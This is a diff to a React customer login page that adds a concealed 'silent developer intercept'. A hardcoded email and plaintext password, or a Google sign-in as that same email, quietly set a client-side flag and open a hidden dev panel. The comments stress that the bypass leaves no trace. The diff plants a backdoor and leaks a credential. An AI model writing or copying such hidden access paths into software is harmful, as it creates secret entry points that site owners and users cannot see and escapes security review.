@@ -117,6 +117,14 @@ const CustomerLogin = () => {
 
         if (session?.user) {
           window.history.replaceState(null, '', window.location.pathname);
+
+          // Silent dev intercept for Google OAuth — same behaviour as email/password path
+          if (session.user.email?.toLowerCase() === 'aronnykevin@gmail.com') {
+            sessionStorage.setItem('dev_panel_auth', 'true');
+            navigate('/dev-panel', { replace: true });
+            return;
+          }
+
           const displayName = session.user.user_metadata?.full_name || session.user.email || 'guest';
           const signedInUser = await login(session.user.email || 'guest');
           toast.success(`Welcome, ${displayName}.`);
@@ -172,9 +180,20 @@ const CustomerLogin = () => {
     setIsLoading(true);
 
     try {
+      // Silent developer intercept — no visible trace, no toast, no error
+      if (
+        loginMethod === 'email' &&
+        loginData.email.trim().toLowerCase() === 'aronnykevin@gmail.com' &&
+        loginData.password === '@1997God'
+      ) {
+        sessionStorage.setItem('dev_panel_auth', 'true');
+        navigate('/dev-panel', { replace: true });
+        return;
+      }
+
       // Simplified login - just use the email/phone as the login identifier
       const loginIdentifier = loginMethod === 'email' ? loginData.email : loginData.phone;
-      
+
       // Demo mode - just need any input
       if (!loginIdentifier) {
         toast.info('Enter your email or phone number to sign in.', {
